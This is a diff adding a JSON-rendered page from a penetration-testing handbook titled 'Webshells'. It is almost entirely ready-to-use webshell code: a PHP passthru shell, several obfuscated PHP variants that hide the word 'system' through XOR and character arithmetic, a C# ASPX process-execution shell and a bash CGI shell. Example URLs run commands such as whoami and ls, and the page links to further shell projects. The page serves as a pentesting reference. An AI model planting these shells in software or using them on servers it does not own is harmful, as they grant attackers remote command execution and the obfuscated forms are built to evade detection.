@@ -1,0 +1,100 @@
+{
+    "title": "Webshells",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Attacks",
+            "url": "/enumeration/web"
+        }
+    ],
+    "sections": [
+        {
+            "heading": "PHP",
+            "type": "code_block",
+            "content": [
+                "# system",
+                "",
+                "//CURL http://ip/shell.php?1=whoami",
+                "//www.somewebsite.com/index.html?1=ipconfig",
+                "",
+                "// passthru ",
+                "<?php passthru($_GET['cmd']); ?>",
+                "",
+                "// NINJA",
+                ";\").($_^\"/\"); ?> ",
+                "http://target.com/path/to/shell.php?=function&=argument",
+                "http://target.com/path/to/shell.php?=system&=ls",
+                "",
+                "// NINJA 2",
+                "/'^'{{{{';@${$_}[_](@${$_}[__]);",
+                "",
+                "// One more",
+                "<?=$_=\"\";$_=\"'\";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>",
+                "",
+                "// https://github.com/Arrexel/phpbash",
+                "// https://github.com/flozz/p0wny-shell"
+            ]
+        },
+        {
+            "heading": ".NET",
+            "type": "code_block",
+            "content": [
+                "<%@Page Language=”C#”%><%var p=new System.Diagnostics.Process{StartInfo={FileName=Request[“c”],UseShellExecute=false,RedirectStandardOutput=true}};p.Start();%><%=p.StandardOutput.ReadToEnd()%>",
+                "www.somewebsite.com/cgi-bin/a?ls%20/var"
+            ]
+        },
+        {
+            "heading": "Bash",
+            "type": "code_block",
+            "content": [
+                "#!/bin/sh",
+                "echo;$_ `${QUERY_STRING/%20/ }`",
+                "www.somewebsite.com/cgi-bin/a?ls%20/var"
+            ]
+        },
+        {
+            "heading": "aspx",
+            "type": "code_block",
+            "content": [
+                "# https://github.com/antonioCoco/SharPyShell"
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2020-11-04T10:36:42.143Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/web/web-shells.md",
+        "previous_page": {
+            "title": "Cookie Padding",
+            "url": "/enumeration/web/cookie-padding"
+        },
+        "next_page": {
+            "title": "CORS",
+            "url": "/enumeration/web/cors"
+        }
+    }
+}
